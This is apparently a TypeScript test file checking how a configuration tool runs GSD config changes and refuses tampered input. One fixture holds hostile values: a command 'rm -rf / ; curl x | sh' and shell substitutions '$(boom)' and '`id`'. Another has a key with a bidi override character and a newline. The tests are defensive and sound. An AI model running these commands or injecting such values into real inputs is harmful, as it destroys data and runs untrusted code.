import { describe, expect, test } from 'claude-code/testing'

import type { HunkOp } from '../../types'
import { GSD_AUTONOMY } from '../framework/gsd/adapter'
import { isUnmetHunk } from '../framework/gsd/hunks'
import type { GsdToolContext } from '../framework/gsd/tools'
import { BIDI_OVERRIDE, emptySetupScan, file } from '../testkit'
import { hunkFailureLine, hunkProposal, hunkRuns, hunksAfterRuns } from './hunks'
import type { HunkRun } from './hunks'

/** A user-level GSD in the fixture home, as hunkStep builds the tool context from proven facts (D-71). */
const USER_GSD: GsdToolContext = {
  userDir: '/home/u/.claude/gsd-core',
  home: '/home/u',
  root: '/repo',
  configDir: null,
}

/** The GSD tool command as the plan displays it for the user-level GSD. */
const GSD_TOOLS = 'node ~/.claude/gsd-core/bin/gsd-tools.cjs'

/** The required GSD `mode` hunk, accepted and runnable, as hunkStep builds it. */
const MODE_HUNK: HunkOp = {
  kind: 'hunk',
  file: '.planning/config.json',
  key: 'mode',
  before: '"interactive"',
  after: '"yolo"',
  isRequired: true,
  isAccepted: true,
  isRunnable: true,
  command: `${GSD_TOOLS} config-set mode yolo`,
}

/** The optional GSD context-warnings hunk, accepted and runnable. */
const WARNINGS_HUNK: HunkOp = {
  ...MODE_HUNK,
  key: 'hooks.context_warnings',
  before: 'not set (GSD default)',
  after: 'false',
  isRequired: false,
  command: `${GSD_TOOLS} config-set hooks.context_warnings false`,
}

/** The run of MODE_HUNK through the user-level GSD. */
const MODE_RUN: HunkRun = {
  key: 'mode',
  file: '.planning/config.json',
  argv: ['node', '/home/u/.claude/gsd-core/bin/gsd-tools.cjs', 'config-set', 'mode', 'yolo'],
  display: `${GSD_TOOLS} config-set mode yolo`,
}

describe('hunk runs (D-106)', () => {
  test('hunkProposal finds the proposal an adapter offers for this setup by the hunk file and key; else null', () => {
    const statusline = emptySetupScan({
      carry: { autoCompactWindow: null, hasStatusLine: true, isGsdStatusline: true, envNames: [] },
    })

    expect(hunkProposal(emptySetupScan(), MODE_HUNK)).toEqual(GSD_AUTONOMY.find(proposal => proposal.key === 'mode'))
    expect(hunkProposal(emptySetupScan(), { ...MODE_HUNK, file: '.claude/settings.json' })).toBeNull()
    expect(hunkProposal(emptySetupScan(), { ...MODE_HUNK, key: 'workflow.unknown' })).toBeNull()
    expect(hunkProposal(emptySetupScan(), WARNINGS_HUNK)).toBeNull()
    expect(hunkProposal(statusline, WARNINGS_HUNK)?.key).toBe('hooks.context_warnings')
  })

  test('an accepted, runnable hunk runs the argv its adapter proposal resolves to, with its display', () => {
    expect(hunkRuns([MODE_HUNK], emptySetupScan(), USER_GSD)).toEqual([MODE_RUN])
  })

  test('the displayed command and values are never read: a tampered hunk still runs the proposal argv', () => {
    const tampered: HunkOp = { ...MODE_HUNK, before: '$(boom)', after: '`id`', command: 'rm -rf / ; curl x | sh' }

    expect(hunkRuns([tampered], emptySetupScan(), USER_GSD)).toEqual([MODE_RUN])
  })

  test('a declined hunk, one cadre cannot run and one no adapter offers give no run, in hunk order', () => {
    const declined: HunkOp = { ...MODE_HUNK, isAccepted: false }
    const notRunnable: HunkOp = { ...MODE_HUNK, isRunnable: false }
    const unknown: HunkOp = { ...MODE_HUNK, key: 'workflow.unknown' }
    const textMode: HunkOp = { ...MODE_HUNK, key: 'workflow.text_mode' }
    const runs = hunkRuns([declined, notRunnable, unknown, textMode, MODE_HUNK], emptySetupScan(), USER_GSD)

    expect(runs.map(run => run.key)).toEqual(['workflow.text_mode', 'mode'])
    expect(runs[0]?.argv).toEqual([
      'node',
      '/home/u/.claude/gsd-core/bin/gsd-tools.cjs',
      'config-set',
      'workflow.text_mode',
      'false',
    ])
  })

  test('without a user-level GSD no hunk runs: a repo-local GSD is printed, never run (D-28, D-72)', () => {
    expect(hunkRuns([MODE_HUNK, WARNINGS_HUNK], emptySetupScan(), { ...USER_GSD, userDir: null })).toEqual([])
    expect(hunkRuns([MODE_HUNK], emptySetupScan(), { ...USER_GSD, userDir: '.claude/gsd-core' })).toEqual([])
  })

  test('hunksAfterRuns makes a failed hunk not runnable, so a required one attends its roles (D-120)', () => {
    const after = hunksAfterRuns([MODE_HUNK, WARNINGS_HUNK], new Set(['mode']))

    expect(after).toEqual([{ ...MODE_HUNK, isRunnable: false }, WARNINGS_HUNK])
    expect(after.map(isUnmetHunk)).toEqual([true, false])
    expect(hunksAfterRuns([MODE_HUNK, WARNINGS_HUNK], new Set(['hooks.context_warnings'])).map(isUnmetHunk)).toEqual([
      false,
      false,
    ])
    expect(hunksAfterRuns([MODE_HUNK], new Set())).toEqual([MODE_HUNK])
    expect(MODE_HUNK.isRunnable).toBe(true)
  })

  test('hunkFailureLine names the file, the key and the command to run by hand, each cleaned', () => {
    const hostile: HunkRun = { ...MODE_RUN, key: `mo${BIDI_OVERRIDE}\nde` }

    expect(hunkFailureLine(MODE_RUN)).toBe(
      `the .planning/config.json change mode failed: run it yourself: ${GSD_TOOLS} config-set mode yolo`,
    )
    expect(hunkFailureLine(hostile)).toBe(
      `the .planning/config.json change mode failed: run it yourself: ${GSD_TOOLS} config-set mode yolo`,
    )
  })
})
